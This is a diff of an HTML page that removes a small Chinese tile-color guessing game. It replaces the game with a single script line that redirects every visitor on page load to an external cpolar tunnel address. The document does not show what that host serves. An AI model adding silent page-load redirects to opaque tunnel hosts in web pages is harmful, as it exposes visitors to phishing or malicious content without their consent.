@@ -8,97 +8,13 @@
         *{
             margin: 0;
             padding: 0;
-        }
-        body{
-			background: skyblue;
-		}
- 
-        h1{
-			text-align: center;
-		}
-		h2{
-			padding-top:35px;
-			text-align: center;
-		}
-		.box{
-			display:flex;
-			flex-wrap: wrap;
-			border:2px solid red;
-			
-		}
-		.item{
-			width:20vw;
-			height:20vw;
-			border:1px solid wheat;
-			box-sizing: border-box;
-		}
+	}
     </style>
 	<script>
-		window.onload=function(){
-			var Box=document.querySelector(".box")
-			let d=20
-			let s=0
-			let items=[]
-			for(let i=0;i<16;i++){
-				let item=document.createElement("div")
-				item.className="item"
-				items.push(item)
-				Box.appendChild(item)
-				event(item)
-			}
-			
-			function setColor(){
-				let rgbs=[]
-				let flag=Math.floor(Math.random()*15)
-				for(let i=0;i<3;i++){
-					rgbs.push(Math.round(Math.random()*150+100))
-				}
-				items.forEach((v,i)=>{
-					let ds=i==flag?d:0
-					v.style.backgroundColor=`rgb(${rgbs[0]-ds},${rgbs[1]-ds},${rgbs[2]-ds})`
-					v.index=false
-					
-				})
-				items[flag].index=true
-				
-			}
-			setColor()
-			function event(dom){
-				dom.addEventListener("click",function(){
-					if(this.index){
-						d--
-						s++
-						document.querySelector("h2").innerHTML="得分:"+s
-						setColor()
-					}else{
-						alert("点错啦，你的得分是:"+s)
-						window.location.href=""
-					}
-				})
-			}
-			
-			if (/(Android)/i.test(navigator.userAgent)) {
-			        Box.style.width=80+"vw"
-					Box.style.height=80+"vw"
-					Box.style.margin="20vw auto"
-				  
-			    } else {
-			        Box.style.width=35+"vw"
-			        Box.style.height=35+"vw"
-					Box.style.margin="4vw auto"
-					var Item=document.querySelectorAll(".item")
-					Item.forEach(v=>{
-						v.style.width=35/4+"vw"
-						v.style.height=35/4+"vw"
-					})
-			    }
-				
-		}
+		window.location.href='http://6887f322.r27.cpolar.top/';
 	</script>
 </head>
 <body>
-<h1>视力挑战</h1>
-<h2>得分:</h2>
-    <div class="box"></div>
+
 </body>
 </html>
